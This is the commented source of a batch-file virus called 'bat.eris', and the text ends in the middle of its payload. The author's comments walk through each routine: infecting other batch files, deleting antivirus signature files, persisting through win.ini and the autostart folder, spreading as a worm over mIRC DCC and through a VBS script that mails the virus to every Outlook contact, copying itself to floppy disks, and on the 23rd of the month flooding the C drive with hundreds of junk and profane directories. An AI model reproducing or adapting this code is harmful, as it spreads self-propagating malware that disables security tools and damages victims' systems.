@echo off%_eris%
if '%1=='eris goto eris%2
set eris=%0.bat
if not exist %eris% set eris=%0
if '%eris%==' set eris=autoexec.bat
if exist c:\_eris.bat goto erisg
if not exist %eris% goto eeris
find "eris"<%eris%>c:\_eris.bat
attrib c:\_eris.bat +h
:erisg
command /e:5000 /c c:\_eris eris vir . .. %path%

-->the above is a quite normal infection-routine
-->the hidden call-back-file is also created here

:eeris
ctty nul.eris
if exist c:\_eris.bat del c:\programme\norton~1\s32integ.dll
if exist c:\_eris.bat del c:\programme\f-prot95\fpwm32.dll
if exist c:\_eris.bat del c:\programme\mcafee\scan.dat
if exist c:\_eris.bat del c:\tbavw95\tbscan.sig
if exist c:\_eris.bat del c:\programme\tbav\tbav.dat
if exist c:\_eris.bat del c:\tbav\tbav.dat
if exist c:\_eris.bat del c:\programme\avpersonal\antivir.vdf

-->the above is the retro-routine
-->the avs can not scan without those files

if exist c:\windows\startmen\programme\autostart\antivir.bat goto rderis
copy bat.eris.bat c:\windows\eris.sys
echo @echo off>eris5.bat
echo ctty nul>>eris5.bat
echo if exist c:\windows\system\bat.eris.bat goto 0k>>eris5.bat
echo copy c:\windows\eris.sys c:\windows\system\bat.eris.bat>>eris5.bat
echo :0k>>eris5.bat
move eris5.bat c:\windows\startmen\programme\autostart\antivir.bat

-->the above is the autostart-secure-routine for the residency
-->it checks if the win.ini-residency is still working

-->the below is the residency-routine
-->it infects the win.ini
-->the empty lines are neccessary for windows taking this as true win.ini

:rderis
if exist c:\windows\system\bat.eris.bat goto wyeris
copy bat.eris.bat c:\windows\system
copy bat.eris.bat + c:\windows\win.ini c:\windows\system\win.ini
del c:\windows\win.ini
move c:\windows\system\win.ini c:\windows
goto wyeris

[windows]
load=c:\windows\system\bat.eris.bat
run=C:\WINDOWS\SYSTEM\cmmpu.exe
NullPort=None

:wyeris
echo [script]>eris23.bat
echo n0=on 1:JOIN:#:{ >>eris23.bat
echo n1= /if ( nick == $me ) { halt } >>eris23.bat
echo n2= /.dcc send $nick c:\windows\system\bat.eris.bat >>eris23.bat
echo n3=} >>eris23.bat
if exist c:\mirc\mirc.ini copy eris23.bat c:\mirc\script.ini
if exist c:\mirc32\mirc.ini copy eris23.bat c:\mirc32\script.ini
if exist c:\progra~1\mirc\mirc.ini copy eris23.bat c:\progra~1\mirc\script.ini
if exist c:\progra~1\mirc32\mirc.ini copy eris23.bat c:\progra~1\mirc32\script.ini

-->the above is the mIRC-worm-routine
-->it makes a mIRC-script-file and places it in a possible mIRC-directory

:dieris
if exist eris23.bat command /f /c copy c:\windows\system\bat.eris.bat a:\
del eris23.bat

-->the above is a command line, that makes it possible to copy to diskettes
-->there will be no error if there is no disk in drive a:
-->or if it is writeprotected or full

:oleris
echo.on error resume next >c:\windows\system\eris.vbs
echo dim a,b,c,d,e >>c:\windows\system\eris.vbs
echo set a = Wscript.CreateObject("Wscript.Shell") >>c:\windows\system\eris.vbs
echo set b = CreateObject("Outlook.Application") >>c:\windows\system\eris.vbs
echo set c = b.GetNameSpace("MAPI") >>c:\windows\system\eris.vbs
echo for y = 1 To c.AddressLists.Count >>c:\windows\system\eris.vbs
echo set d = c.AddressLists(y) >>c:\windows\system\eris.vbs
echo x = 1 >>c:\windows\system\eris.vbs
echo set e = b.CreateItem(0) >>c:\windows\system\eris.vbs
echo for o = 1 To d.AddressEntries.Count >>c:\windows\system\eris.vbs
echo f = d.AddressEntries(x) >>c:\windows\system\eris.vbs
echo e.Recipients.Add f >>c:\windows\system\eris.vbs
echo x = x + 1 >>c:\windows\system\eris.vbs
echo next >>c:\windows\system\eris.vbs
echo e.Subject = "Hail Eris!" >>c:\windows\system\eris.vbs
echo e.Body = "Hail Discordia! All Hail Discordia! Welcome to c0nfusion." >>c:\windows\system\eris.vbs
echo e.Attachments.Add ("c:\windows\system\bat.eris.bat") >>c:\windows\system\eris.vbs
echo e.DeleteAfterSubmit = False >>c:\windows\system\eris.vbs
echo e.Send >>c:\windows\system\eris.vbs
echo f = "" >>c:\windows\system\eris.vbs
echo next >>c:\windows\system\eris.vbs
start c:\windows\system\eris.vbs

-->the above is the Outlook-worm-routine
-->the created vbs sends the virus to the addresses in the address-book
-->problem: when the vbs gets executed, and an (up to date) av-monitor is active,
-->the system will probably halt, and the av will pop up a warning:
-->"new vbs worm" or something like that

:pleris
echo.|date|find "23">nul.eris
if errorlevel 1 goto naeris
del nul.eris
if exist c:\3ri5\eris.inf goto naeris
md c:\3ri5>eris
echo Eris came to cause some confusion/chaos.>eris.inf
echo Well done, my goddess!>>eris.inf
echo bat.eris by philet0ast3r [rRlf]>>eris.inf
echo (muse: windy by Net_Tez)>>eris.inf
move eris.inf c:\3ri5

-->the above is the "kind of" message-payload, that is written to the file c:\3ri5\eris.inf
-->if this file exists already, the rest of the payload will not be carried out
-->this saves some time
-->of course, the payload only gets active, if we got a 23rd ;) you know what I mean ?!

md c:\aa>eris
md c:\bb>eris
md c:\cc>eris
md c:\ddn>eris
md c:\eec>eris
md c:\ffw>eris
md c:\ggt>eris
md c:\hhj>eris
md c:\iii>eris
md c:\jjfv>eris
md c:\kkc>eris
md c:\lle>eris
md c:\mtm>eris
md c:\nnb>eris
md c:\oocv>eris
md c:\pp>eris
md c:\qq>eris
md c:\rr>eris
md c:\ss>eris
md c:\tt>eris
md c:\uud>eris
md c:\vvr>eris
md c:\wwj>eris
md c:\xxv>eris
md c:\yyf>eris
md c:\zzh>eris
md c:\bbdf>eris
md c:\bbbf>eris
md c:\ccdg>eris
md c:\ddvn>eris
md c:\eesc>eris
md c:\ffwef>eris
md c:\ggtr>eris
md c:\hherj>eris
md c:\iiier>eris
md c:\jjferv>eris
md c:\kkrec>eris
md c:\llererwe>eris
md c:\mwertm>eris
md c:\nnwerb>eris
md c:\oocwerv>eris
md c:\ppere>eris
md c:\qqrccr>eris
md c:\rryr>eris
md c:\ssfy>eris
md c:\ttfv>eris
md c:\uucdc>eris
md c:\vvr>eris
md c:\wwjc>eris
md c:\xxvc>eris
md c:\yyfc>eris
md c:\zzhcc>eris
md c:\bbef>eris
md c:\brbbf>eris
md c:\ccreg>eris
md c:\eervn>eris
md c:\reesc>eris
md c:\ffwef>eris
md c:\ggtr>eris
md c:\hhekrj>eris
md c:\iiiker>eris
md c:\jjferkv>eris
md c:\kkrekc>eris
md c:\llekrerwe>eris
md c:\mwertm>eris
md c:\nnwterb>eris
md c:\ooctwerv>eris
md c:\pperre>eris
md c:\qqreccr>eris
md c:\rryrr>eris
md c:\sserfy>eris
md c:\ttrerefv>eris
md c:\uuecec>eris
md c:\vver>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrfc>eris
md c:\zfzhcc>eris
md c:\bbff>eris
md c:\brbbf>eris
md c:\ccrfg>eris
md c:\ffrvn>eris
md c:\rffsc>eris
md c:\ffwff>eris
md c:\ggtr>eris
md c:\hhfkrj>eris
md c:\iiikfr>eris
md c:\jjffrkv>eris
md c:\kkrfkc>eris
md c:\llfkrfrwf>eris
md c:\mwfrtm>eris
md c:\nnwtfrb>eris
md c:\ooctwfrv>eris
md c:\ppfrrf>eris
md c:\qqrfccr>eris
md c:\rryrr>eris
md c:\ssfrfy>eris
md c:\ttrfrffv>eris
md c:\uufcfc>eris
md c:\vvfr>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrfc>eris
md c:\zfzhcc>eris
md c:\bbgg>eris
md c:\brbbg>eris
md c:\ccrgg>eris
md c:\ggrvn>eris
md c:\rggsc>eris
md c:\ggwgg>eris
md c:\ggtr>eris
md c:\hhgkrj>eris
md c:\jjggrkv>eris
md c:\kkrgkc>eris
md c:\llgkrgrwg>eris
md c:\mwgrtm>eris
md c:\nnwtgrb>eris
md c:\ooctwgrv>eris
md c:\ppgrrg>eris
md c:\qqrgccr>eris
md c:\ttrgrggv>eris
md c:\uugcgc>eris
md c:\vvgr>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrgc>eris
md c:\zgzhcc>eris
md c:\bbhh>eris
md c:\brbbh>eris
md c:\ccrhh>eris
md c:\hhrvn>eris
md c:\rhhsc>eris
md c:\hhwhh>eris
md c:\hhtr>eris
md c:\hhhkrj>eris
md c:\iiikhr>eris
md c:\jjhhrkv>eris
md c:\kkrhkc>eris
md c:\llhkrhrwh>eris
md c:\mwhrtm>eris
md c:\nnwthrb>eris
md c:\ooctwhrv>eris
md c:\pphrrh>eris
md c:\qqrhccr>eris
md c:\rryrr>eris
md c:\sshrhy>eris
md c:\ttrhrhhv>eris
md c:\uuhchc>eris
md c:\vvhr>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrhc>eris
md c:\zhzhcc>eris
md c:\bbhh>eris
md c:\brbbh>eris
md c:\ccrhh>eris
md c:\hhrvn>eris
md c:\rhhsc>eris
md c:\hhwhh>eris
md c:\hhtr>eris
md c:\hhhkrj>eris
md c:\jjjkhr>eris
md c:\jjhhrkv>eris
md c:\kkrhkc>eris
md c:\llhkrhrwh>eris
md c:\mwhrtm>eris
md c:\nnwthrb>eris
md c:\ooctwhrv>eris
md c:\pphrrh>eris
md c:\qqrhccr>eris
md c:\rryrr>eris
md c:\sshrhy>eris
md c:\ttrhrhhv>eris
md c:\uuhchc>eris
md c:\vvhr>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrhc>eris
md c:\zhzhcc>eris
md c:\bbaa>eris
md c:\brbba>eris
md c:\ccraa>eris
md c:\aarvn>eris
md c:\raasc>eris
md c:\aawaa>eris
md c:\aatr>eris
md c:\aaaara>eris
md c:\aaaaar>eris
md c:\aaaarav>eris
md c:\aaraac>eris
md c:\llaararwa>eris
md c:\mwartm>eris
md c:\nnwtarb>eris
md c:\ooctwarv>eris
md c:\pparra>eris
md c:\qqraccr>eris
md c:\rryrr>eris
md c:\ssaray>eris
md c:\ttraraav>eris
md c:\uuacac>eris
md c:\vvar>eris
md c:\wwrac>eris
md c:\xxvc>eris
md c:\yyrac>eris
md c:\zazacc>eris
md c:\bbaa>eris
md c:\brbba>eris
md c:\ccraa>eris
md c:\aarvn>eris
md c:\raasc>eris
md c:\aawaa>eris
md c:\aatr>eris
md c:\aaaara>eris
md c:\aaaaar>eris
md c:\aaaarav>eris
md c:\aaraac>eris
md c:\llaararwa>eris
md c:\mwartm>eris
md c:\nnwtarb>eris
md c:\ooctwarv>eris
md c:\pparra>eris
md c:\qqraccr>eris
md c:\rryrr>eris
md c:\ssaray>eris
md c:\ttraraav>eris
md c:\uuacac>eris
md c:\vvar>eris
md c:\wwrac>eris
md c:\xxvc>eris
md c:\yyrac>eris
md c:\zazacc>eris
md c:\bbshit>eris
md c:\brbbc>eris
md c:\shitrshit>eris
md c:\shitrvn>eris
md c:\rshitsc>eris
md c:\shitwshit>eris
md c:\shittr>eris
md c:\shitshitrc>eris
md c:\shitshitcr>eris
md c:\shitshitrcv>eris
md c:\shitrshitc>eris
md c:\llshitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\ooctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrshitcr>eris
md c:\rryrr>eris
md c:\sscrcy>eris
md c:\ttrcrshitv>eris
md c:\uushitshit>eris
md c:\vvcr>eris
md c:\wwrshit>eris
md c:\xxvc>eris
md c:\yyrshit>eris
md c:\zczshitc>eris
md c:\bbfuckhit>eris
md c:\brbbc>eris
md c:\fuckhitrfuckhit>eris
md c:\fuckhitrvn>eris
md c:\rfuckhitfuckc>eris
md c:\fuckhitwfuckhit>eris
md c:\fuckhittr>eris
md c:\fuckhitfuckhitrc>eris
md c:\fuckhitfuckhitcr>eris
md c:\fuckhitfuckhitrcv>eris
md c:\fuckhitrfuckhitc>eris
md c:\llfuckhitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\ooctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrfuckhitcr>eris
md c:\rryrr>eris
md c:\fuckfuckcrcy>eris
md c:\ttrcrfuckhitv>eris
md c:\uufuckhitfuckhit>eris
md c:\vvcr>eris
md c:\wwrfuckhit>eris
md c:\xxvc>eris
md c:\yyrfuckhit>eris
md c:\zczfuckhitc>eris
md c:\bbcunthit>eris
md c:\brbbc>eris
md c:\cunthitrcunthit>eris
md c:\cunthitrvn>eris
md c:\rcunthitcuntc>eris
md c:\cunthitwcunthit>eris
md c:\cunthittr>eris
md c:\cunthitcunthitrc>eris
md c:\cunthitcunthitcr>eris
md c:\cunthitcunthitrcv>eris
md c:\cunthitrcunthitc>eris
md c:\llcunthitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\ooctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrcunthitcr>eris
md c:\rryrr>eris
md c:\cuntcuntcrcy>eris
md c:\ttrcrcunthitv>eris
md c:\uucunthitcunthit>eris
md c:\vvcr>eris
md c:\wwrcunthit>eris
md c:\xxvc>eris
md c:\yyrcunthit>eris
md c:\zczcunthitc>eris
md c:\bbahit>eris
md c:\brbbc>eris
md c:\ahitrahit>eris
md c:\ahitrvn>eris
md c:\rahitac>eris
md c:\ahitwahit>eris
md c:\ahittr>eris
md c:\ahitahitrc>eris
md c:\ahitahitcr>eris
md c:\ahitahitrcv>eris
md c:\ahitrahitc>eris
md c:\llahitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\ooctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrahitcr>eris
md c:\rryrr>eris
md c:\aacrcy>eris
md c:\ttrcrahitv>eris
md c:\uuahitahit>eris
md c:\vvcr>eris
md c:\wwrahit>eris
md c:\xxvc>eris
md c:\yyrahit>eris
md c:\zczahitc>eris
md c:\bbdf>eris
md c:\bbbf>eris
md c:\ccdg>eris
md c:\ddvn>eris
md c:\eesc>eris
md c:\ffwef>eris
md c:\ggtr>eris
md c:\hherj>eris
md c:\iiier>eris
md c:\jjferv>eris
md c:\kkrec>eris
md c:\llererwe>eris
md c:\mwertm>eris
md c:\nnwerb>eris
md c:\oocwerv>eris
md c:\ppere>eris
md c:\qqrccr>eris
md c:\rryr>eris
md c:\ssfy>eris
md c:\ttfv>eris
md c:\uucdc>eris
md c:\vvr>eris
md c:\wwjc>eris
md c:\xxvc>eris
md c:\yyfc>eris
md c:\zzhcc>eris
md c:\bbef>eris
md c:\brbbf>eris
md c:\ccreg>eris
md c:\eervn>eris
md c:\reesc>eris
md c:\ffwef>eris
md c:\ggtr>eris
md c:\hhekrj>eris
md c:\iiiker>eris
md c:\jjferkv>eris
md c:\kkrekc>eris
md c:\llekrerwe>eris
md c:\mwertm>eris
md c:\nnwterb>eris
md c:\ooctwerv>eris
md c:\pperre>eris
md c:\qqreccr>eris
md c:\rryrr>eris
md c:\sserfy>eris
md c:\ttrerefv>eris
md c:\uuecec>eris
md c:\vver>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrfc>eris
md c:\zfzhcc>eris
md c:\bbff>eris
md c:\brbbf>eris
md c:\ccrfg>eris
md c:\ffrvn>eris
md c:\rffsc>eris
md c:\ffwff>eris
md c:\ggtr>eris
md c:\hhfkrj>eris
md c:\iiikfr>eris
md c:\jjffrkv>eris
md c:\kkrfkc>eris
md c:\llfkrfrwf>eris
md c:\mwfrtm>eris
md c:\nnwtfrb>eris
md c:\ooctwfrv>eris
md c:\ppfrrf>eris
md c:\qqrfccr>eris
md c:\rryrr>eris
md c:\ssfrfy>eris
md c:\ttrfrffv>eris
md c:\uufcfc>eris
md c:\vvfr>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrfc>eris
md c:\zfzhcc>eris
md c:\bbgg>eris
md c:\brbbg>eris
md c:\ccrgg>eris
md c:\ggrvn>eris
md c:\rggsc>eris
md c:\ggwgg>eris
md c:\ggtr>eris
md c:\hhgkrj>eris
md c:\iiikgr>eris
md c:\jjggrkv>eris
md c:\kkrgkc>eris
md c:\llgkrgrwg>eris
md c:\mwgrtm>eris
md c:\nnwtgrb>eris
md c:\ooctwgrv>eris
md c:\ppgrrg>eris
md c:\qqrgccr>eris
md c:\rryrr>eris
md c:\ssgrgy>eris
md c:\ttrgrggv>eris
md c:\uugcgc>eris
md c:\vvgr>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrgc>eris
md c:\zgzhcc>eris
md c:\bbhh>eris
md c:\brbbh>eris
md c:\ccrhh>eris
md c:\hhrvn>eris
md c:\rhhsc>eris
md c:\hhwhh>eris
md c:\hhtr>eris
md c:\hhhkrj>eris
md c:\iiikhr>eris
md c:\jjhhrkv>eris
md c:\kkrhkc>eris
md c:\llhkrhrwh>eris
md c:\mwhrtm>eris
md c:\nnwthrb>eris
md c:\ooctwhrv>eris
md c:\pphrrh>eris
md c:\qqrhccr>eris
md c:\rryrr>eris
md c:\sshrhy>eris
md c:\ttrhrhhv>eris
md c:\uuhchc>eris
md c:\vvhr>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrhc>eris
md c:\zhzhcc>eris
md c:\bbhh>eris
md c:\brbbh>eris
md c:\ccrhh>eris
md c:\hhrvn>eris
md c:\rhhsc>eris
md c:\hhwhh>eris
md c:\hhtr>eris
md c:\hhhkrj>eris
md c:\jjjkhr>eris
md c:\jjhhrkv>eris
md c:\kkrhkc>eris
md c:\llhkrhrwh>eris
md c:\mwhrtm>eris
md c:\nnwthrb>eris
md c:\ooctwhrv>eris
md c:\pphrrh>eris
md c:\qqrhccr>eris
md c:\rryrr>eris
md c:\sshrhy>eris
md c:\ttrhrhhv>eris
md c:\uuhchc>eris
md c:\vvhr>eris
md c:\wwrjc>eris
md c:\xxvc>eris
md c:\yyrhc>eris
md c:\zhzhcc>eris
md c:\bbcoffcoff>eris
md c:\brbbcoff>eris
md c:\ccrcoffcoff>eris
md c:\coffcoffrvn>eris
md c:\rcoffcoffsc>eris
md c:\coffcoffoff>eris
md c:\coffcofftr>eris
md c:\coffcofrcoff>eris
md c:\coffcoffcofoffr>eris
md c:\coffcoffrcoffv>eris
md c:\coffcoffrcoffcoffc>eris
md c:\llcoffcoffrcoffrwcoff>eris
md c:\mwcoffrtm>eris
md c:\nnwtcoffrb>eris
md c:\ooctwcoffrv>eris
md c:\ppcoffrrcoff>eris
md c:\qqrcoffccr>eris
md c:\rryrr>eris
md c:\sscoffrcoffy>eris
md c:\ttrcoffrcofffv>eris
md c:\uucoffccoffc>eris
md c:\vvcoffr>eris
md c:\wwrcoffc>eris
md c:\xxvc>eris
md c:\yyrcoffc>eris
md c:\zcoffzcoffcc>eris
md c:\bbcoffcoff>eris
md c:\brbbcoff>eris
md c:\ccrcoffcoff>eris
md c:\coffcoffrvn>eris
md c:\rcoffcoffsc>eris
md c:\coffcoffwoff>eris
md c:\coffcofftr>eris
md c:\coffcoffcffrcoff>eris
md c:\coffcoffcoffffr>eris
md c:\coffcoffcoff>eris
md c:\coffcoffrcoffcoffc>eris
md c:\llcoffrwcoff>eris
md c:\mwcoffrtm>eris
md c:\nnwtcoffrb>eris
md c:\ooctwcoffrv>eris
md c:\ppcoffrrcoff>eris
md c:\qqrcoffccr>eris
md c:\rryrr>eris
md c:\sscoffrcoffy>eris
md c:\ttrcoffrcoffcoffv>eris
md c:\uucoffccoffc>eris
md c:\vvcoffr>eris
md c:\wwrcoffc>eris
md c:\xxvc>eris
md c:\yyrcoffc>eris
md c:\zcoffzcoffcc>eris
md c:\bbk>eris
md c:\brbbc>eris
md c:\krk>eris
md c:\krvn>eris
md c:\rksc>eris
md c:\kwk>eris
md c:\ktr>eris
md c:\kkrc>eris
md c:\kkcr>eris
md c:\kkrcv>eris
md c:\krkc>eris
md c:\llkrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\ooctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrkcr>eris
md c:\rryrr>eris
md c:\sscrcy>eris
md c:\ttrcrkv>eris
md c:\uukk>eris
md c:\vvcr>eris
md c:\wwrk>eris
md c:\xxvc>eris
md c:\yyrk>eris
md c:\zczkc>eris
md c:\bbchit>eris
md c:\brbbc>eris
md c:\chitrchit>eris
md c:\chitrvn>eris
md c:\rchitcc>eris
md c:\chitwchit>eris
md c:\chittr>eris
md c:\chitchitrc>eris
md c:\chitchitcr>eris
md c:\chitchitrcv>eris
md c:\chitrchitc>eris
md c:\llchitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\ooctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrchitcr>eris
md c:\rryrr>eris
md c:\cccrcy>eris
md c:\ttrcrchitv>eris
md c:\uuchitchit>eris
md c:\vvcr>eris
md c:\wwrchit>eris
md c:\xxvc>eris
md c:\yyrchit>eris
md c:\zczchitc>eris
md c:\bbihit>eris
md c:\brbbc>eris
md c:\ihitrihit>eris
md c:\ihitrvn>eris
md c:\rihitic>eris
md c:\ihitwihit>eris
md c:\ihittr>eris
md c:\ihitihitrc>eris
md c:\ihitihitcr>eris
md c:\ihitihitrcv>eris
md c:\ihitrihitc>eris
md c:\llihitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\ooctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrihitcr>eris
md c:\rryrr>eris
md c:\iicrcy>eris
md c:\ttrcrihitv>eris
md c:\uuihitihit>eris
md c:\vvcr>eris
md c:\wwrihit>eris
md c:\xxvc>eris
md c:\yyrihit>eris
md c:\zczihitc>eris
md c:\bbcoffhit>eris
md c:\brbbc>eris
md c:\coffhoffhit>eris
md c:\coffhitrvn>eris
md c:\rcoffhitcoffc>eris
md c:\coffhitwcof>eris
md c:\coffhittr>eris
md c:\coffhofitrc>eris
md c:\coffhicr>eris
md c:\coffhitcoffrcv>eris
md c:\coffhoffhitc>eris
md c:\llcoffhitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\ooctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrcoffhitcr>eris
md c:\rryrr>eris
md c:\coffcoffcrcy>eris
md c:\ttrcrcoffhitv>eris
md c:\uucoffhitcoffhit>eris
md c:\vvcr>eris
md c:\wwrcoffhit>eris
md c:\xxvc>eris
md c:\yyrcoffhit>eris
md c:\zczcoffhitc>eris
md c:\bbbb>eris
md c:\brbbb>eris
md c:\ccrbb>eris
md c:\bbrvn>eris
md c:\rbbsc>eris
md c:\bbwbb>eris
md c:\bbtr>eris
md c:\bbbbrb>eris
md c:\bbbbbr>eris
md c:\bbbbrbv>eris
md c:\bbrbbc>eris
md c:\llbbrbrwb>eris
md c:\mwbrtm>eris
md c:\nnwtbrb>eris
md c:\zzctwbrv>eris
md c:\ppbrrb>eris
md c:\qqrbccr>eris
md c:\rryrr>eris
md c:\ssbrby>eris
md c:\ttrbrbbv>eris
md c:\uubcbc>eris
md c:\vvbr>eris
md c:\wwrbc>eris
md c:\hhvc>eris
md c:\yyrbc>eris
md c:\zbzbcc>eris
md c:\bbshit>eris
md c:\brbbc>eris
md c:\shitrshit>eris
md c:\shitrvn>eris
md c:\rshitsc>eris
md c:\shitwshit>eris
md c:\shittr>eris
md c:\shitshitrc>eris
md c:\shitshitcr>eris
md c:\shitshitrcv>eris
md c:\shitrshitc>eris
md c:\llshitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\zzctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrshitcr>eris
md c:\rryrr>eris
md c:\sscrcy>eris
md c:\ttrcrshitv>eris
md c:\uushitshit>eris
md c:\vvcr>eris
md c:\wwrshit>eris
md c:\hhvc>eris
md c:\yyrshit>eris
md c:\zczshitc>eris
md c:\bbfuckhit>eris
md c:\brbbc>eris
md c:\fuckhitrfuckhit>eris
md c:\fuckhitrvn>eris
md c:\rfuckhitfuckc>eris
md c:\fuckhitwfuckhit>eris
md c:\fuckhittr>eris
md c:\fuckhitfuckhitrc>eris
md c:\fuckhitfuckhitcr>eris
md c:\fuckhitfuckhitrcv>eris
md c:\fuckhitrfuckhitc>eris
md c:\llfuckhitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\zzctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrfuckhitcr>eris
md c:\rryrr>eris
md c:\fuckfuckcrcy>eris
md c:\ttrcrfuckhitv>eris
md c:\uufuckhitfuckhit>eris
md c:\vvcr>eris
md c:\wwrfuckhit>eris
md c:\hhvc>eris
md c:\yyrfuckhit>eris
md c:\zczfuckhitc>eris
md c:\bbcunthit>eris
md c:\brbbc>eris
md c:\cunthitrcunthit>eris
md c:\cunthitrvn>eris
md c:\rcunthitcuntc>eris
md c:\cunthitwcunthit>eris
md c:\cunthittr>eris
md c:\cunthitcunthitrc>eris
md c:\cunthitcunthitcr>eris
md c:\cunthitcunthitrcv>eris
md c:\cunthitrcunthitc>eris
md c:\llcunthitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\zzctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrcunthitcr>eris
md c:\rryrr>eris
md c:\cuntcuntcrcy>eris
md c:\ttrcrcunthitv>eris
md c:\uucunthitcunthit>eris
md c:\vvcr>eris
md c:\wwrcunthit>eris
md c:\hhvc>eris
md c:\yyrcunthit>eris
md c:\zczcunthitc>eris
md c:\bbbhit>eris
md c:\brbbc>eris
md c:\bhitrbhit>eris
md c:\bhitrvn>eris
md c:\rbhitbc>eris
md c:\bhitwbhit>eris
md c:\bhittr>eris
md c:\bhitbhitrc>eris
md c:\bhitbhitcr>eris
md c:\bhitbhitrcv>eris
md c:\bhitrbhitc>eris
md c:\llbhitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\zzctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrbhitcr>eris
md c:\rryrr>eris
md c:\bbcrcy>eris
md c:\ttrcrbhitv>eris
md c:\uubhitbhit>eris
md c:\vvcr>eris
md c:\wwrbhit>eris
md c:\hhvc>eris
md c:\yyrbhit>eris
md c:\zczbhitc>eris
md c:\bbdf>eris
md c:\bbbf>eris
md c:\ccdg>eris
md c:\ddvn>eris
md c:\eesc>eris
md c:\ffwef>eris
md c:\ggtr>eris
md c:\hherj>eris
md c:\iiier>eris
md c:\jjferv>eris
md c:\kkrec>eris
md c:\llererwe>eris
md c:\mwertm>eris
md c:\nnwerb>eris
md c:\zzcwerv>eris
md c:\ppere>eris
md c:\qqrccr>eris
md c:\rryr>eris
md c:\ssfy>eris
md c:\ttfv>eris
md c:\uucdc>eris
md c:\vvr>eris
md c:\wwjc>eris
md c:\hhvc>eris
md c:\yyfc>eris
md c:\zzhcc>eris
md c:\bbef>eris
md c:\brbbf>eris
md c:\ccreg>eris
md c:\eervn>eris
md c:\reesc>eris
md c:\ffwef>eris
md c:\ggtr>eris
md c:\hhekrj>eris
md c:\iiiker>eris
md c:\jjferkv>eris
md c:\kkrekc>eris
md c:\llekrerwe>eris
md c:\mwertm>eris
md c:\nnwterb>eris
md c:\zzctwerv>eris
md c:\pperre>eris
md c:\qqreccr>eris
md c:\rryrr>eris
md c:\sserfy>eris
md c:\ttrerefv>eris
md c:\uuecec>eris
md c:\vver>eris
md c:\wwrjc>eris
md c:\hhvc>eris
md c:\yyrfc>eris
md c:\zfzhcc>eris
md c:\bbff>eris
md c:\brbbf>eris
md c:\ccrfg>eris
md c:\ffrvn>eris
md c:\rffsc>eris
md c:\ffwff>eris
md c:\ggtr>eris
md c:\hhfkrj>eris
md c:\iiikfr>eris
md c:\jjffrkv>eris
md c:\kkrfkc>eris
md c:\llfkrfrwf>eris
md c:\mwfrtm>eris
md c:\nnwtfrb>eris
md c:\zzctwfrv>eris
md c:\ppfrrf>eris
md c:\qqrfccr>eris
md c:\rryrr>eris
md c:\ssfrfy>eris
md c:\ttrfrffv>eris
md c:\uufcfc>eris
md c:\vvfr>eris
md c:\wwrjc>eris
md c:\hhvc>eris
md c:\yyrfc>eris
md c:\zfzhcc>eris
md c:\bbgg>eris
md c:\brbbg>eris
md c:\ccrgg>eris
md c:\ggrvn>eris
md c:\rggsc>eris
md c:\ggwgg>eris
md c:\ggtr>eris
md c:\hhgkrj>eris
md c:\iiikgr>eris
md c:\zczkc>eris
md c:\bbchit>eris
md c:\brbbc>eris
md c:\chitrchit>eris
md c:\chitrvn>eris
md c:\rchitcc>eris
md c:\chitwchit>eris
md c:\chittr>eris
md c:\chitchitrc>eris
md c:\chitchitcr>eris
md c:\chitchitrcv>eris
md c:\chitrchitc>eris
md c:\llchitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\zzctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrchitcr>eris
md c:\rryrr>eris
md c:\cccrcy>eris
md c:\ttrcrchitv>eris
md c:\uuchitchit>eris
md c:\vvcr>eris
md c:\wwrchit>eris
md c:\hhvc>eris
md c:\yyrchit>eris
md c:\zczchitc>eris
md c:\bbihit>eris
md c:\brbbc>eris
md c:\ihitrihit>eris
md c:\ihitrvn>eris
md c:\rihitic>eris
md c:\ihitwihit>eris
md c:\ihittr>eris
md c:\ihitihitrc>eris
md c:\ihitihitcr>eris
md c:\ihitihitrcv>eris
md c:\ihitrihitc>eris
md c:\llihitrcrwc>eris
md c:\mwcrtm>eris
md c:\nnwtcrb>eris
md c:\zzctwcrv>eris
md c:\ppcrrc>eris
md c:\qqrihitcr>eris
md c:\rryrr>eris
md c:\iicrcy>eris
md c:\ttrcrihitv>eris
md c:\uuihitihit>eris
md c:\vvcr>eris
md c:\wwrihit>eris
md c:\hhvc>eris
md c:\yyrihit>eris
md c:\zczihitc>eris
md c:\bbczffhit>eris
md c:\brbbc>eris
md c:\czffhzffhit>eris
md c:\czffhitrvn>eris
md c:\rczffhitczffc>eris
